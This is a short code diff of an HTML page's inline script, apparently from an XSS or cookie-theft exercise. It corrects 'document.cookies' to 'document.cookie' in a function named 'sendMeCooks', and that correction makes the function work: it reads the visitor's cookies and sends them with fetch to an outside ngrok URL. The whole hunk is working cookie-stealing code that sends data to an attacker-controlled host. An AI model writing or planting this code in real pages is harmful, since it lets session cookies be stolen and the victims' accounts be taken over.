@@ -11,8 +11,8 @@
     }
     
     function sendMeCooks() {
-      alert(document.cookies);
-      var cks = document.cookies;
+      alert(document.cookie);
+      var cks = document.cookie;
       fetch(`http://66191a0f.ngrok.io/?payload=${cks}`);
     }
   </script>
